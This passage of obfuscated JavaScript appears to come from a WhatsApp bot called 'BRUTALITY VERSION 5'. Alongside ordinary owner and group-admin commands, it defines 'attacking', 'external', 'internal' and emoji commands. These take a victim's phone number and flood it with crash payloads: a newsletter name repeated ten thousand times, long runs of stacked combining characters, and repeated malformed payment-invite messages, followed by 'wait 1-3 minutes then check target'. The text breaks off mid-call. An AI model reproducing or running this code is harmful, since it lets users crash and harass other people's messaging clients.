          _0x303a92(global.ataskiri + " `SETTINGS MENU BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "self\n" + global.samping + global.simbol + " " + _0x23c579 + "public\n" + global.samping + global.simbol + " " + _0x23c579 + "setppbot\n" + global.samping + global.simbol + " " + _0x23c579 + "setppbot /full\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "addowner":
      case "addown":
        if (!_0x3845b7) {
          return _0x303a92(global.spesialown);
        }
        if (!_0x395806[0x0]) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        bnnd = _0x16d390.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0xaac36 = await _0x4fb13b.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0xaac36.length == 0x0) {
          return _0x303a92("Masukkan nomor yang valid dan daftar di WhatsApp!");
        }
        _0x330797.push(bnnd);
        _0x1877a0.push(bnnd);
        fs.writeFileSync('./lib/database/owner.json', JSON.stringify(_0x330797));
        fs.writeFileSync("./lib/database/premium.json", JSON.stringify(_0x1877a0));
        _0x303a92("Nomor " + bnnd + " telah di hapus dalam database owner!");
        break;
      case "delowner":
      case 'delown':
        if (!_0x3845b7) {
          return _0x303a92(global.spesialown);
        }
        if (!_0x395806[0x0]) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        yaki = _0x16d390.split('|')[0x0].replace(/[^0-9]/g, '');
        unp = _0x330797.indexOf(yaki);
        anp = _0x1877a0.indexOf(yaki);
        _0x330797.splice(unp, 0x1);
        _0x1877a0.splice(anp, 0x1);
        fs.writeFileSync("./lib/database/owner.json", JSON.stringify(_0x330797));
        fs.writeFileSync("./lib/database/premium.json", JSON.stringify(_0x1877a0));
        _0x303a92("Nomor " + yaki + " telah di hapus dalam database owner!");
        break;
      case 'addpremium':
      case 'addprem':
        if (!_0x3845b7) {
          return _0x303a92(global.spesialown);
        }
        if (!_0x395806[0x0]) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        bnnd = _0x16d390.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x4f920b = await _0x4fb13b.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x4f920b.length == 0x0) {
          return _0x303a92("Masukkan nomor yang valid dan daftar di WhatsApp!");
        }
        _0x1877a0.push(bnnd);
        fs.writeFileSync('./lib/database/premium.json', JSON.stringify(_0x1877a0));
        _0x303a92("Nomor " + bnnd + " telah di tambahkan dalam database premium!");
        break;
      case "delpremium":
      case "delprem":
        if (!_0x3845b7) {
          return _0x303a92(global.spesialown);
        }
        if (!_0x395806[0x0]) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        yaki = _0x16d390.split('|')[0x0].replace(/[^0-9]/g, '');
        unp = _0x1877a0.indexOf(yaki);
        _0x1877a0.splice(unp, 0x1);
        fs.writeFileSync("./lib/database/premium.json", JSON.stringify(_0x1877a0));
        _0x303a92("Nomor " + yaki + " telah di hapus dalam database premium!");
        break;
      case "listowner":
      case "listown":
        if (!_0x3845b7) {
          return _0x303a92(global.spesialown);
        }
        teksooo = "*List Owner*\n\n";
        for (let _0x47fc58 of _0x330797) {
          teksooo += "- " + _0x47fc58 + "\n";
        }
        teksooo += "\n*Total : " + _0x330797.length + '*';
        _0x4fb13b.sendMessage(_0x50877c, {
          'text': teksooo.trim()
        }, "extendeqtextMessage", {
          'quoted': _0x2decff,
          'contextInfo': {
            'mentionedJid': _0x330797
          }
        });
        break;
      case "listpremium":
      case "listprem":
        if (!_0x3845b7) {
          return _0x303a92(global.spesialown);
        }
        teksooo = "*List Premium*\n\n";
        for (let _0x1dc100 of _0x1877a0) {
          teksooo += "- " + _0x1dc100 + "\n";
        }
        teksooo += "\n*Total : " + _0x1877a0.length + '*';
        _0x4fb13b.sendMessage(_0x50877c, {
          'text': teksooo.trim()
        }, 'extendeqtextMessage', {
          'quoted': _0x2decff,
          'contextInfo': {
            'mentionedJid': _0x1877a0
          }
        });
        break;
      case "hidetag":
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          if (!_0x2decff.isGroup) {
            return _0x303a92(global.noingroup);
          }
          await loading();
          _0x4fb13b.sendMessage(_0x50877c, {
            'text': q ? q : '',
            'mentions': _0x1a2731.map(_0x335d4d => _0x335d4d.id)
          }, {
            'quoted': _0x2decff
          });
        }
        break;
      case 'kick':
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          if (!_0x2decff.isGroup) {
            return _0x303a92(global.noingroup);
          }
          if (!_0x372379) {
            return _0x303a92(global.nobotadmin);
          }
          if (!_0x4d729f) {
            return _0x303a92(global.usernoadmin);
          }
          await loading();
          let _0x39f582 = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : _0x16d390.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x4fb13b.groupParticipantsUpdate(_0x50877c, [_0x39f582], "remove");
        }
        break;
      case "add":
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          if (!_0x2decff.isGroup) {
            return _0x303a92(global.noingroup);
          }
          if (!_0x372379) {
            return _0x303a92(global.nobotadmin);
          }
          if (!_0x4d729f) {
            return _0x303a92(global.usernoadmin);
          }
          await loading();
          let _0x161847 = _0x2decff.quoted ? _0x2decff.quoted.sender : _0x16d390.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x4fb13b.groupParticipantsUpdate(_0x50877c, [_0x161847], 'add');
        }
        break;
      case "promote":
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          if (!_0x2decff.isGroup) {
            return _0x303a92(global.noingroup);
          }
          if (!_0x372379) {
            return _0x303a92(global.nobotadmin);
          }
          if (!_0x4d729f) {
            return _0x303a92(global.usernoadmin);
          }
          await loading();
          let _0x547673 = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : _0x16d390.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x4fb13b.groupParticipantsUpdate(_0x50877c, [_0x547673], "promote");
        }
        break;
      case "demote":
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          if (!_0x2decff.isGroup) {
            return _0x303a92(global.noingroup);
          }
          if (!_0x372379) {
            return _0x303a92(global.nobotadmin);
          }
          if (!_0x4d729f) {
            return _0x303a92(global.usernoadmin);
          }
          await loading();
          let _0x1a93d5 = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : _0x16d390.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x4fb13b.groupParticipantsUpdate(_0x50877c, [_0x1a93d5], "demote");
        }
        break;
      case "editsubjek":
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          if (!_0x2decff.isGroup) {
            return _0x303a92(global.noingroup);
          }
          if (!_0x372379) {
            return _0x303a92(global.nobotadmin);
          }
          if (!_0x4d729f) {
            return _0x303a92(global.usernoadmin);
          }
          if (!_0x16d390) {
            return _0x303a92(global.notext);
          }
          await loading();
          await _0x4fb13b.groupUpdateSubject(_0x50877c, _0x16d390);
        }
        break;
      case "editdesk":
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          if (!_0x2decff.isGroup) {
            return _0x303a92(global.noingroup);
          }
          if (!_0x372379) {
            return _0x303a92(global.nobotadmin);
          }
          if (!_0x4d729f) {
            return _0x303a92(global.usernoadmin);
          }
          if (!_0x16d390) {
            return _0x303a92(global.notext);
          }
          await loading();
          await _0x4fb13b.groupUpdateDescription(_0x50877c, _0x16d390);
        }
        break;
      case 'linkgroup':
      case "linkgc":
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          if (!_0x2decff.isGroup) {
            return _0x303a92(global.noingroup);
          }
          if (!_0x372379) {
            return _0x303a92(global.nobotadmin);
          }
          await loading();
          let _0x1f798d = await _0x4fb13b.groupInviteCode(_0x50877c);
          _0x4fb13b.sendText(_0x50877c, 'https://chat.whatsapp.com/' + _0x1f798d + "\n\nLink Group : " + _0x43fbd3.subject, _0x2decff, {
            'detectLink': true
          });
        }
        break;
      case "resetlinkgc":
        if (!_0x3845b7) {
          return _0x303a92(global.spesialown);
        }
        if (!_0x2decff.isGroup) {
          return _0x303a92(global.noingroup);
        }
        if (!_0x372379) {
          return _0x303a92(global.nobotadmin);
        }
        await loading();
        _0x4fb13b.groupRevokeInvite(_0x50877c);
        break;
      case "public":
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          _0x4fb13b["public"] = true;
          _0x303a92("Sukses mengubah bot menjadi Public");
        }
        break;
      case "self":
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          _0x4fb13b['public'] = false;
          _0x303a92("Sukses mengubah bot menjadi Self");
        }
        break;
      case "setppbot":
      case 'setbotpp':
        {
          if (!_0x3845b7) {
            return _0x303a92(global.spesialown);
          }
          if (!_0x12833a) {
            return _0x303a92("kirim/balas foto dengan caption " + (_0x23c579 + _0xce55e7));
          }
          if (!/image/.test(_0x3afa40)) {
            return _0x303a92("kirim/balas foto dengan caption " + (_0x23c579 + _0xce55e7));
          }
          if (/webp/.test(_0x3afa40)) {
            return _0x303a92("kirim/balas foto dengan caption " + (_0x23c579 + _0xce55e7));
          }
          var _0x35dd26 = await _0x4fb13b.downloadAndSaveMediaMessage(_0x12833a);
          if (_0x395806[0x0] == "/full") {
            var {
              img: _0xa3bc8b
            } = await generateProfilePicture(_0x35dd26);
            await _0x4fb13b.query({
              'tag': 'iq',
              'attrs': {
                'to': _0x1d749f,
                'type': "set",
                'xmlns': 'w:profile:picture'
              },
              'content': [{
                'tag': "picture",
                'attrs': {
                  'type': "image"
                },
                'content': _0xa3bc8b
              }]
            });
            fs.unlinkSync(_0x35dd26);
            _0x303a92("Sukses");
          } else {
            fs.unlinkSync(_0x35dd26);
            _0x303a92("Sukses");
          }
        }
        break;
      case "attacking-v1":
      case 'attacking-v2':
      case "attacking-v3":
      case "attacking-v4":
      case "attacking-v5":
        {
          if (!_0x5a1564) {
            return _0x303a92(global.spesialprem);
          }
          if (!q) {
            return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
          }
          Pe = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : _0x16d390.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x4fb13b.sendMessage(Pe, {
            'text': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴",
            'contextInfo': {
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363222395675670@newsletter",
                'newsletterName': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴".repeat(0x2710),
                'serverMessageId': 0x2
              }
            }
          }, {
            'quoted': _0x9108e4
          });
          await sleep(0x1f4);
          await _0x4fb13b.sendMessage(Pe, {
            'react': {
              'text': '✅',
              'key': {
                'remoteJid': _0x2decff.chat,
                'fromMe': true,
                'id': _0x12833a.id
              }
            }
          });
        }
        break;
      case 'external-v1':
      case 'external-v2':
      case "external-v3":
      case "external-v4":
      case "external-v5":
      case 'internal-v1':
      case "internal-v2":
      case 'internal-v3':
      case "internal-v4":
      case "internal-v5":
        if (!_0x5a1564) {
          return _0x303a92(global.spesialprem);
        }
        if (!q) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        Pe = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x303a92("`[ # ] DIKA ID` \ntunggu 1-3menit lalu cek target!");
        for (let _0x526039 = 0x0; _0x526039 < 0x5; _0x526039++) {
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4279c5(Pe, _0x1559ff);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x1a7d5e(Pe);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x32d24f(Pe);
          _0x4fb13b.sendMessage(Pe, {
            'text': 'ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛̘𞋬𞋬𞋬𞋬𞋬𞋬𞋬'
          }, {
            'quoted': _0x1db8d8
          });
          await sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4279c5(Pe, _0x1559ff);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x1a7d5e(Pe);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x32d24f(Pe);
          _0x4fb13b.sendMessage(Pe, {
            'text': "ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛̘𞋬𞋬𞋬𞋬𞋬𞋬𞋬"
          }, {
            'quoted': _0x1db8d8
          });
          await sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4279c5(Pe, _0x1559ff);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x1a7d5e(Pe);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x32d24f(Pe);
          _0x4fb13b.sendMessage(Pe, {
            'text': "ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛̘𞋬𞋬𞋬𞋬𞋬𞋬𞋬"
          }, {
            'quoted': _0x1db8d8
          });
          await sleep(0x1f4);
        }
        await _0x4fb13b.sendMessage(Pe, {
          'react': {
            'text': '✅',
            'key': {
              'remoteJid': _0x2decff.chat,
              'fromMe': true,
              'id': _0x12833a.id
            }
          }
        });
        break;
      case '🤪':
      case '😱':
      case '🌊':
      case '⚡':
      case '🌀':
      case '🪷':
      case '🌸':
      case '🤓':
        if (!_0x5a1564) {
          return _0x303a92(global.spesialprem);
        }
        if (!q) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        Pe = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x303a92("`[ # ] DIKA ID` \ntunggu 1-3menit lalu cek target!");
        for (let _0x299d30 = 0x0; _0x299d30 < 0x3; _0x299d30++) {
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4279c5(Pe, _0x1559ff);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x1a7d5e(Pe);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x32d24f(Pe);
          _0x4fb13b.sendMessage(Pe, {
            'text': "ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛̘𞋬𞋬𞋬𞋬𞋬𞋬𞋬"
          }, {
            'quoted': _0x1db8d8
          });
          await sleep(0x1f4);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4279c5(Pe, _0x1559ff);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x1a7d5e(Pe);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x32d24f(Pe);
          _0x4fb13b.sendMessage(Pe, {
